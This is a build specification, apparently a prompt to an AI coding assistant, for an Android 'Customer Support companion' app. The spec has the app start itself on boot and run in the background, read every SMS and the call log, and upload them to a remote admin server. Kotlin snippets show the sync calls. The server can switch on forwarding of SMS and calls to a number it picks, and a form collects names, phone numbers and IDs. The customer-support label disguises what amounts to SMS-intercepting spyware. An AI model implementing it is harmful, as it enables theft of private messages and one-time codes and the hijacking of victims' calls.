## Instructions

Build a Customer Support Android companion app that connects to the web admin panel via Socket.IO. The app should run as a background service and sync device data to the server.

### Core Features

1. **Background Service**
   - Runs persistently in the background (Foreground Service for Android 8+)
   - Auto-starts on device boot
   - Maintains Socket.IO connection to admin panel

2. **Socket.IO Connection**
   - Connect to server at configurable IP/port (default: ws://SERVER_IP:3001)
   - Auto-reconnect on connection loss
   - Register device with unique ID, device name, and phone number

3. **Data Sync to Admin Panel**
   - **SMS Sync**: Read all SMS messages and send to server via `sms:sync` event
   - **Call Log Sync**: Read call history and send via `calls:sync` event
   - Periodic background sync (every 5 minutes)
   - Real-time sync when new SMS/call is detected

4. **User Information Form**
   - Simple form with fields: Name, Phone Number, ID
   - On submit, send data to server via `form:submit` event
   - Store submitted data locally

5. **Forwarding Configuration**
   - Listen for `forwarding:config` event from server
   - When SMS forwarding enabled: forward incoming SMS to configured number
   - When call forwarding enabled: set up call forwarding to configured number

### Technical Requirements

- **Min SDK**: 24 (Android 7.0)
- **Target SDK**: 34 (Android 14)
- **Language**: Kotlin
- **Architecture**: MVVM with Hilt dependency injection
- **Socket.IO Client**: io.socket:socket.io-client:2.1.0

### Required Permissions
- READ_SMS, RECEIVE_SMS
- READ_CALL_LOG
- READ_PHONE_STATE
- FOREGROUND_SERVICE
- RECEIVE_BOOT_COMPLETED
- INTERNET

### Socket.IO Events

**Emit to Server:**
```kotlin
// On connect
socket.emit("device:register", JSONObject().apply {
    put("id", deviceId)        // Unique device identifier
    put("name", deviceName)    // Device model/name
    put("phoneNumber", phoneNumber)
})

// Sync SMS
socket.emit("sms:sync", JSONObject().apply {
    put("deviceId", deviceId)
    put("sms", smsJsonArray)   // Array of SMS objects
})

// Sync Calls
socket.emit("calls:sync", JSONObject().apply {
    put("deviceId", deviceId)
    put("calls", callsJsonArray) // Array of call log objects
})

// Submit form
socket.emit("form:submit", JSONObject().apply {
    put("deviceId", deviceId)
    put("name", userName)
    put("phoneNumber", userPhone)
    put("id", oderId)
})
```

**Listen from Server:**
```kotlin
socket.on("forwarding:config") { args ->
    val config = args[0] as JSONObject
    val smsEnabled = config.getBoolean("smsEnabled")
    val smsForwardTo = config.getString("smsForwardTo")
    val callsEnabled = config.getBoolean("callsEnabled")
    val callsForwardTo = config.getString("callsForwardTo")
    // Apply forwarding settings
}
```

### UI Screens

1. **Setup/Onboarding Screen**
   - Enter server IP address
   - Test connection button
   - Start service button

2. **Main Dashboard**
   - Connection status indicator
   - Last sync timestamp
   - Manual sync button
   - Settings access

3. **User Form Screen**
   - Input fields: Name, Phone, ID
   - Submit button
   - History of submissions

4. **Settings Screen**
   - Server URL configuration
   - Sync interval setting
   - View current forwarding config
   - Stop/Start service toggle

### Build with modern Android practices
- Use Jetpack Compose for UI
- Room database for local storage
- WorkManager for periodic sync
- DataStore for preferences
